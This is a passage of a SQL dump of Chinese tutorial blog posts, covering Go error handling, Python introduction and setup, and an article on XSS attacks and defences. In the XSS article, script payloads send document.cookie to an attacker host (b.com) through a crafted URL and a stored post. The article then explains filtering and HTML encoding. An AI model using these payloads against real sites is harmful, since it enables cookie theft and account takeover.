fmt.Println(result)\r\n   }\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\nMath: negative number passed to Sqrt\r\n3</pre>\r\n',0,0,'go语言系列教程22-错误处理',64,NULL,0),(52,0,'20150618172821',2,'<p>&nbsp;&nbsp; &nbsp;XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>\r\n\r\n<p>XSS攻击</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，<strong>所有可输入的地方</strong>没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。</p>\r\n\r\n<p>DOM Based XSS</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;<strong>场景一</strong>：</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：&nbsp;</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"background-color:rgb(242, 242, 242); color:rgb(85, 85, 85); font-family:microsoft yahei; font-size:15px; line-height:35px\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n<code class=\"language-html\">&lt;%@ page language=\"java\"contentType=\"text/html; charset=UTF-8\"pageEncoding=\"UTF-8\"%&gt;\r\n\r\n&lt;!DOCTYPEhtmlPUBLIC\"-//W3C//DTD HTML 4.01 Transitional//EN\"\"http://www.w3.org/TR/html4/loose.dtd\"&gt;\r\n\r\n&lt;html&gt;\r\n\r\n    &lt;head&gt;\r\n\r\n       &lt;title&gt;XSS测试&lt;/title&gt;\r\n\r\n    &lt;/head&gt;\r\n\r\n    &lt;body&gt;\r\n\r\n       页面内容：&lt;%=request.getParameter(\"content\")%&gt;\r\n\r\n    &lt;/body&gt;\r\n\r\n&lt;/html&gt;</code></pre>\r\n\r\n			<p>&nbsp;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><span style=\"color:rgb(85, 85, 85); font-family:microsoft yahei; font-size:15px\">&nbsp; &nbsp; &nbsp; 我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=&lt;script&gt;window.open(&ldquo;www.b.com?param=&rdquo;+document.cookie)&lt;/script&gt;，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=&lt;script&gt;alert(&ldquo;xss&rdquo;)&lt;/script&gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Stored XSS</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;<strong>场景二</strong>：</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;script&gt;window.open(&ldquo;www.b.com?param=&rdquo;+document.cookie)&lt;/script&gt;，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。<br />\r\n&nbsp; &nbsp; &nbsp; &nbsp;Stored XSS漏洞危害性更大，危害面更广。</p>\r\n\r\n<p>XSS防御</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。</p>\r\n\r\n<p>完善的过滤体系</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</p>\r\n\r\n<p>Html encode</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>\r\n\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"background-color:rgb(242, 249, 255); color:rgb(85, 85, 85); font-family:microsoft yahei; font-size:15px; line-height:35px; width:675px\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">less-than character (&lt;)</span></p>\r\n			</td>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">&amp;lt;</span></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">greater-than character (&gt;)</span></p>\r\n			</td>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">&amp;gt;</span></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">ampersand character (&amp;)</span></p>\r\n			</td>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">&amp;amp;</span></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">double-quote character (&quot;)</span></p>\r\n			</td>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">&amp;quot;</span></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">space character( )</span></p>\r\n			</td>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">&amp;nbsp;</span></p>\r\n			</td>\r\n		</tr>\r\n		<tr>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">Any ASCII code character whose code is greater-than or equal to 0x80</span></p>\r\n			</td>\r\n			<td>\r\n			<p><span style=\"color:rgb(46, 46, 46)\">&amp;#&lt;number&gt;, where &lt;number&gt; is the ASCII character value.</span></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><span style=\"color:rgb(85, 85, 85); font-family:microsoft yahei; font-size:15px\">&nbsp; &nbsp; &nbsp;&nbsp;比如用户输入：&lt;script&gt;window.location.href=&rdquo;http://www.baidu.com&rdquo;;&lt;/script&gt;，保存后最终存储的会是：&amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>其它</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;下面提供两种Html encode的方法。</p>\r\n\r\n<ul>\r\n	<li>使用Apache的commons-lang.jar\r\n	<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\">\r\n		<tbody>\r\n			<tr>\r\n				<td>\r\n				<p>StringEscapeUtils.escapeHtml(str);// 汉字会转换成对应的ASCII码，空格不转换</p>\r\n				</td>\r\n			</tr>\r\n		</tbody>\r\n	</table>\r\n	</li>\r\n</ul>\r\n\r\n<ul>\r\n	<li>自己实现转换，只转换部分字符\r\n	<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"background-color:rgb(242, 242, 242); background-position:initial initial; background-repeat:initial initial\">\r\n		<tbody>\r\n			<tr>\r\n				<td>\r\n				<pre>\r\n<code class=\"language-java\">private static String htmlEncode(char c) {\r\n\r\n    switch(c) {\r\n\r\n       case \'&amp;\':\r\n\r\n           return\"&amp;amp;\";\r\n\r\n       case \'&lt;\':\r\n\r\n           return\"&amp;lt;\";\r\n\r\n       case \'&gt;\':\r\n\r\n           return\"&amp;gt;\";\r\n\r\n       case \'\"\':\r\n\r\n           return\"&amp;quot;\";\r\n\r\n       case \' \':\r\n\r\n           return\"&amp;nbsp;\";\r\n\r\n       default:\r\n\r\n           return c +\"\";\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\n/** 对传入的字符串str进行Html encode转换 */\r\n\r\npublic static String htmlEncode(String str) {\r\n\r\n    if(str ==null || str.trim().equals(\"\"))   return str;\r\n\r\n    StringBuilder encodeStrBuilder = new StringBuilder();\r\n\r\n    for (int i = 0, len = str.length(); i &lt; len; i++) {\r\n\r\n       encodeStrBuilder.append(htmlEncode(str.charAt(i)));\r\n\r\n    }\r\n\r\n    return encodeStrBuilder.toString();\r\n\r\n}</code></pre>\r\n\r\n				<p>&nbsp;</p>\r\n				</td>\r\n			</tr>\r\n		</tbody>\r\n	</table>\r\n	</li>\r\n</ul>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;(完)&nbsp;</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp;本文来自：高爽|Coder，原文地址：http://blog.csdn.net/ghsau/article/details/17027893，转载请注明。</p>\r\n',0,0,'XSS攻击及防御',69,NULL,0),(53,0,'20150619085706',1,'<p style=\"text-align:justify\">Python是一种简单易学，功能强大的编程语言。它包括了高效的高级数据结构和简单而有效的方法，面向对象编程。Python优雅的语法，动态类型，以及它天然的解释能力，使其成为理想的语言，脚本和应用程序快速开发在大多数平台上的许多领域。</p>\r\n\r\n<p style=\"text-align:justify\">Python解释器及其扩展标准库的源码和编译版本可以从Python的Web站点，http://www.python.org/所有主要平台可自由查看，并且可以自由发布。该站点上也包含了分配和指针到很多免费的第三方Python模块，程序，工具，以及附加的文档。</p>\r\n\r\n<p style=\"text-align:justify\">Python的解释器很容易扩展新的功能，并在C或C ++（或由C来调用其他语言）实现的数据类型。 Python也很适于作为定制应用的一种扩展语言。</p>\r\n\r\n<p style=\"text-align:justify\">本教程向读者介绍了非正式的Python语言和系统的基本概念和功能。它有助于理解Python和实战练习，当然所有的例子都是自包含的，所以这本手册可以离线阅读为好。</p>\r\n\r\n<p style=\"text-align:justify\">有关标准对象和模块的详细介绍，请参见Python标准库。Python语言参考给出了语言的更正式的定义。需要编写C或C + +扩展，请阅读扩展和嵌入Python解释器和Python/C的API参考手册。也有几本书涵盖了各个深度的Python。</p>\r\n\r\n<p style=\"text-align:justify\">本教程并不试图全面，涵盖每一个功能，甚至每一个常用功能。相反，它介绍了许多Python中最引人注目的功能，会给Python语言的韵味和风格是一个好开始。看完之后，你就可以阅读和编写Python模块和程序，将准备进一步了解Python标准库描述的各种Python库模块。</p>\r\n',0,0,'python系列教程-1-简介',103,NULL,0),(54,0,'20150619085919',1,'<p>Python是一种高层次的，解释性的，交互式和面向对象的脚本语言。Python被设计成具有很强的可读性，它使用英语如其他语言常用空白作为标点符号，它比其他语言语法结构更少。</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Python被解析：</strong>这意味着它是在运行时由解释器处理，你并不需要在执行前编译程序。这类似于Perl和PHP。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Python是互动：</strong>这意味着你可以在Python的提示和解释器进行交互，直接写出你的程序。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Python是面向对象的：</strong>这意味着Python支持面向对象的方式或程序，它封装了对象中的代码的技术。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Python是初学者的语言：</strong>Python是为初级程序员一种伟大的语言，并支持广泛的应用，从简单的文本处理，WWW浏览器，以游戏开发。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Python的历史：</p>\r\n\r\n<p>Python是由Guido van Rossum在八十年代末和九十年代初在全国研究所数学与计算机科学在荷兰开发。</p>\r\n\r\n<p>Python从许多其他语言，包括ABC，Modula-3语言，C语言，C+ +，Algol-68，Smalltalk和unix的shell等脚本语言得到参考开发。</p>\r\n\r\n<p>Python是有版权的。比如Perl，Python源代码现在是GNU通用公共许可证(GPL)下提供。</p>\r\n\r\n<p>Python的现在是由一个核心开发团队在维护，虽然Guido van Rossum仍然持有在指导其进展至关重要的作用。</p>\r\n\r\n<p>Python的特点：</p>\r\n\r\n<p>Python的功能亮点包括：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>易于学习：</strong>Python有相对较少的关键字，结构简单，明确的语法。这让学生学习的时间相对较短。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>易于阅读：</strong>Python代码是更加明确，可见。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>易于维护：</strong>Python的成功在于它的源代码是相当容易维护。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>广泛的标准库：</strong>Python的最大优点是体积库很方便，在UNIX，Windows和Macintosh跨平台兼容。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>交互模式：</strong>支持交互模式中，可以从终端输入结果正确的语言，让交互测试的代码片段和调试。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>便携式：</strong>Python可以在多种硬件平台上运行，并且对所有的平台上使用相同的接口。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>扩展：</strong>可以添加低级别的模块在Python解释器。这些模块使程序员可以添加或自定义自己的工具来提高效率。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>数据库：</strong>Python提供接口给所有主要的商业数据库。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>GUI编程：</strong>Python支持，可以创建并移植到许多系统调用，库和Windows系统，如Windows MFC，Macintosh和Unix的X Window系统的GUI应用程序。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>可扩展性：</strong>Python提供了一个更好的结构，并支持比shell脚本大型程序。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>除了上面提到的功能，Python也有很好的功能，几个列举如下：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>支持功能和结构化的编程方法，以及面向对象。</p>\r\n	</li>\r\n	<li>\r\n	<p>它可以作为一种脚本语言，或者可以被编译为字节码建立大型的应用程序。</p>\r\n	</li>\r\n	<li>\r\n	<p>非常高的动态数据类型，并且支持动态类型检查。</p>\r\n	</li>\r\n	<li>\r\n	<p>支持自动垃圾收集。</p>\r\n	</li>\r\n	<li>\r\n	<p>它可以用C，C + +，COM和ActiveX，CORBA和Java很容易地集成。</p>\r\n	</li>\r\n</ul>\r\n',0,0,'python系列教程-2-概述',76,NULL,0),(55,0,'20150619090028',1,'<p>本地环境设置</p>\r\n\r\n<p>如果愿意设置您的Python环境，让我们了解如何建立Python环境。 Python可在各种平台，包括Linux和Mac OS X，可尝试打开一个终端窗口并输入&ldquo;python&rdquo;，以检查是否已经安装了python，什么版本，如果已经有安装。</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Unix (Solaris, Linux, FreeBSD, AIX, HP/UX, SunOS, IRIX, etc.)</p>\r\n	</li>\r\n	<li>\r\n	<p>Win 9x/NT/2000</p>\r\n	</li>\r\n	<li>\r\n	<p>Macintosh (Intel, PPC, 68K)</p>\r\n	</li>\r\n	<li>\r\n	<p>OS/2</p>\r\n	</li>\r\n	<li>\r\n	<p>DOS (multiple versions)</p>\r\n	</li>\r\n	<li>\r\n	<p>PalmOS</p>\r\n	</li>\r\n	<li>\r\n	<p>Nokia 手机</p>\r\n	</li>\r\n	<li>\r\n	<p>Windows CE</p>\r\n	</li>\r\n	<li>\r\n	<p>Acorn/RISC OS</p>\r\n	</li>\r\n	<li>\r\n	<p>BeOS</p>\r\n	</li>\r\n	<li>\r\n	<p>Amiga</p>\r\n	</li>\r\n	<li>\r\n	<p>VMS/OpenVMS</p>\r\n	</li>\r\n	<li>\r\n	<p>QNX</p>\r\n	</li>\r\n	<li>\r\n	<p>VxWorks</p>\r\n	</li>\r\n	<li>\r\n	<p>Psion</p>\r\n	</li>\r\n	<li>\r\n	<p>Python也可被移植到Java和.NET 虚拟机</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>获得Python</p>\r\n\r\n<p>最新源代码，二进制文件，文档，新闻等可在Python的官方网站：</p>\r\n\r\n<p>Python官方网站：http://www.python.org/</p>\r\n\r\n<p>可以从以下站点下载Python文档。文件格式是HTML，PDF和PostScript。</p>\r\n\r\n<p>Python文档网站：&nbsp;www.python.org/doc/</p>\r\n\r\n<p>安装Python：</p>\r\n\r\n<p style=\"text-align:justify\">Python发行版适用于各种平台。你只需要下载适用于您的平台的二进制代码并安装Python。</p>\r\n\r\n<p style=\"text-align:justify\">如果二进制代码针对您的平台无法使用，你需要一个C编译器来手动编译源代码。编译源代码提供了选择，为安装功能方面更大的灵活性。</p>\r\n\r\n<p>这里是在各种平台上安装Python的快速概览：</p>\r\n\r\n<p>UNIX和Linux的安装方式：</p>\r\n\r\n<p>下面是简单的步骤，在Unix/ Linux机器上安装Python。</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>打开Web浏览器并转至http://www.python.org/download/</p>\r\n	</li>\r\n	<li>\r\n	<p>按照链接下载压缩的源代码在Unix/ Linux操作系统。</p>\r\n	</li>\r\n	<li>\r\n	<p>下载并解压文件。</p>\r\n	</li>\r\n	<li>\r\n	<p>编辑模块/安装文件，如果你想自定义一些选项。</p>\r\n	</li>\r\n	<li>\r\n	<p>执行./configure 脚本</p>\r\n	</li>\r\n	<li>\r\n	<p>make</p>\r\n	</li>\r\n	<li>\r\n	<p>make install</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>这将安装python的标准位置在 /usr/local/bin目录和它的库安装在/usr/local/lib/pythonXX，其中XX是Python使用的版本。</p>\r\n\r\n<p>Windows上安装:</p>\r\n\r\n<p>下面是Windows机器上安装Python的步骤。</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>打开Web浏览器并转至&nbsp;http://www.python.org/download/</p>\r\n	</li>\r\n	<li>\r\n	<p>按照链接到Windows安装python-XYZ.msi文件，其中XYZ是你要安装的版本。</p>\r\n	</li>\r\n	<li>\r\n	<p>要使用此安装程序python-XYZ.msi，Windows系统必须支持Microsoft安装程序2.0。只需安装程序文件保存到本地计算机，然后运行它，看看是否你的机器支持MSI。</p>\r\n	</li>\r\n	<li>\r\n	<p>通过双击它在Windows中运行下载的文件。这将出Python的安装向导，这些都很容易使用。只需接受默认设置，等到安装完成后。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Macintosh上安装:</p>\r\n\r\n<p>最新的Mac电脑配备安装了Python，但可能好几年前的机器没有安装。见http://www.python.org/download/mac/上获得的最新版本以及额外的工具来支持在Mac上开发的指令。对于老的Mac OS的Mac OS X10.3之前（2003年推出），MacPython上是可用的。&ldquo;</p>\r\n\r\n<p>只要到这个链接，完整Mac OS安装安装细节。</p>\r\n\r\n<p>设置PATH:</p>\r\n\r\n<p>程序和其他可执行文件可以住在许多目录，所以操作系统提供，列出目录的操作系统搜索可执行文件的搜索路径。</p>\r\n\r\n<p>路径被存储在环境变量，这是由操作系统维护的命名字符串。这些变量包含可用于命令行解释器和其他程序的信息。</p>\r\n\r\n<p>路径变量名为Path的Unix或路径在Windows（UNIX是区分大小写的，Windows是没有）。</p>\r\n\r\n<p>在Mac OS中，安装程序处理的道路细节。调用任何特定目录Python解释器，必须Python的目录添加到您的路径。</p>\r\n\r\n<p>设置路径，在Unix/Linux上：</p>\r\n\r\n<p>将Python目录添加到在Unix系统中的特定会话的路径：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>在csh shell：&nbsp;输入<br />\r\n	SETENV&nbsp;PATH &quot;$PATH:/usr/local/bin/python&quot; &nbsp;然后按回车键。</p>\r\n	</li>\r\n	<li>\r\n	<p>在 bash shell (Linux):&nbsp;输入<br />\r\n	export PATH=&quot;$PATH:/usr/local/bin/python&quot; 然后按回车键。</p>\r\n	</li>\r\n	<li>\r\n	<p>在 sh 或&nbsp;&nbsp;ksh shell:&nbsp;输入&nbsp;<br />\r\n	PATH=&quot;$PATH:/usr/local/bin/python&quot;&nbsp;然后按回车键。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>注:&nbsp;/usr/local/bin/python 为Python目录的路径</p>\r\n\r\n<p>设置路径Windows系统：</p>\r\n\r\n<p>以Python目录添加到了 Windows 特定会话的路径：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>在命令提示符下:&nbsp;输入&nbsp;<br />\r\n	path %path%;C:\\Python 然后按Enter键。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>注意：C:\\Python 是Python目录的路径</p>\r\n\r\n<p>Python环境变量：</p>\r\n\r\n<p>这里是重要的环境变量，其可以被Python确认：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(0, 0, 0); font-family:helvetica,arial,sans-serif; font-size:16px; line-height:22px; margin:8px 0px; max-width:100%; padding:0px; vertical-align:top; width:560px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:106px\">变量</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:432px\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">PYTHONPATH</td>\r\n			<td style=\"vertical-align:top\">有类似路径的作用。这个变量告诉Python解释器在哪里可以找到导入到程序中的模块文件。 PYTHONPATH应包括Python源代码库目录，包含Python源代码的目录。 PYTHONPATH是由Python安装程序有时会预设。</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">PYTHONSTARTUP</td>\r\n			<td style=\"vertical-align:top\">包含了在每次启动的解释器（类似于Unix.profile或.login文件）时执行Python源代码的初始化文件的路径。这个文件通常命名为.pythonrc.py。在Unix中，通常包含加载实用程序或修改PYTHONPATH命令。</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">PYTHONCASEOK</td>\r\n			<td style=\"vertical-align:top\">在Windows中使用，以指示Python找到一个import语句，第一个不区分大小写的匹配。将此变量设置为任意值来激活它。</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">PYTHONHOME</td>\r\n			<td style=\"vertical-align:top\">备选模块搜索路径。它通常嵌入在PYTHONSTARTUP或PYTHONPATH目录，以使交换模块库的简单。</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>运行Python:</p>\r\n\r\n<p>有三种不同的方式来启动Python：</p>\r\n\r\n<p>(1) 交互式解释器：</p>\r\n\r\n<p>可以输入python，并在开始通过命令行启动在交互式解释器它编码的时候。从UNIX，DOS或其他系统提供了一个命令行解释器或shell窗口。</p>\r\n\r\n<pre>\r\n$python             # Unix/Linux\r\n\r\nor \r\n\r\npython%             # Unix/Linux\r\n\r\nor \r\n\r\nC:&gt;python           # Windows/DOS\r\n</pre>\r\n\r\n<p>下面是所有可用的命令行选项的列表：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(0, 0, 0); font-family:helvetica,arial,sans-serif; font-size:16px; line-height:22px; margin:8px 0px; max-width:100%; padding:0px; vertical-align:top; width:560px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:101px\">选项</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:437px\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-d</td>\r\n			<td style=\"vertical-align:top\">提供调试输出</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-O</td>\r\n			<td style=\"vertical-align:top\">生成优化代码（结果为.pyo文件）</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-S</td>\r\n			<td style=\"vertical-align:top\">不运行导入网站，在启动时查找Python路径</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-v</td>\r\n			<td style=\"vertical-align:top\">详细输出（在导入语句详细的跟踪）</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-X</td>\r\n			<td style=\"vertical-align:top\">禁止基于类内置异常（只使用字符串）;开始1.6版本过时</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-c cmd</td>\r\n			<td style=\"vertical-align:top\">作为cmd 字符串运行Python脚本发送</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">file</td>\r\n			<td style=\"vertical-align:top\">从给定的文件运行Python脚本</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>(2) 脚本的命令行：</p>\r\n\r\n<p>Python脚本可以在命令行中通过调用应用程序中的解释，如下面的执行：</p>\r\n\r\n<pre>\r\n$python  script.py          # Unix/Linux\r\n\r\nor \r\n\r\npython% script.py           # Unix/Linux\r\n\r\nor \r\n\r\nC:&gt;python script.py         # Windows/DOS\r\n</pre>\r\n\r\n<p>注意：请确保该文件的权限模式可以执行。</p>\r\n\r\n<p>(3)集成开发环境</p>\r\n\r\n<p>您可以从图形用户界面（GUI）环境中运行Python。所有需要的是一个支持Python系统的GUI应用程序。</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>UNIX：IDLE也是早期的UNIX系统为Python的IDE。</p>\r\n	</li>\r\n	<li>\r\n	<p>Windows：PythonWin是第一个Windows界面的Python和一个GUI的IDE。</p>\r\n	</li>\r\n	<li>\r\n	<p>Macintosh：Python的的Macintosh版本随着闲置的IDE可从主站下载，不是MACBINARY就是BinHex&#39;d文件。</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>在继续到下一个章节前，请确保您的环境已正确设置及完全正常工作。如果不能够建立正常的环境，那么可以重新安装配置。&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>所有在以后的章节中给出的例子已经执行了可在Linux CentOS 上的 Python2.7.3版本。</p>\r\n',0,0,'python系列教程-3-环境安装',74,NULL,0),(56,0,'20150619090227',1,'<p>Python与Perl，C和Java语言等有许多相似之处。不过，也有语言之间有一些明确的区别。本章的目的是让你迅速学习Python的语法。</p>\r\n\r\n<p>第一个Python程序：</p>\r\n\r\n<p>交互模式编程：</p>\r\n\r\n<p>调用解释器不经过脚本文件作为参数，显示以下提示：</p>\r\n\r\n<pre>\r\n$ python\r\nPython 2.6.4 (#1, Nov 11 2014, 13:34:43)\r\n[GCC 4.1.2 20120704 (Red Hat 5.6.2-48)] on linux2\r\nType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.\r\n&gt;&gt;&gt;\r\n</pre>\r\n\r\n<p>键入下列文字在Python提示符，然后按Enter键：</p>\r\n\r\n<pre>\r\n&gt;&gt;&gt; print &quot;Hello, Python!&quot;;\r\n</pre>\r\n\r\n<p>如果您运行的是新的Python版本，那么需要使用打印语句括号像print (&quot;Hello, Python!&quot;);。但是在Python版本2.6.4，这将产生以下结果：</p>\r\n\r\n<pre>\r\nHello, Python!\r\n</pre>\r\n\r\n<p>脚本模式编程：</p>\r\n\r\n<p>调用解释器及脚本作为参数，并开始执行的脚本，并一直持续到脚本完成。当脚本完成时，解释器不再是活动的。</p>\r\n\r\n<p>让我们在脚本中编写一个简单的Python程序。所有的Python文件将具有.py扩展。所以，把下面的代码写在一个test.py文件。</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 136); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">print</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\"> </span><span style=\"color:rgb(0, 136, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">&quot;Hello, Python!&quot;</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">;</span></pre>\r\n\r\n<p>在这里，我假设你已经在PATH变量中设置Python解释器。现在，尝试如下运行这个程序：</p>\r\n\r\n<pre>\r\n<span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">$ python test</span><span style=\"color:rgb(102, 102, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">.</span><span style=\"color:rgb(0, 0, 0); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:16px\">py</span></pre>\r\n\r\n<p>这将产生以下结果：</p>\r\n\r\n<pre>\r\nHello, 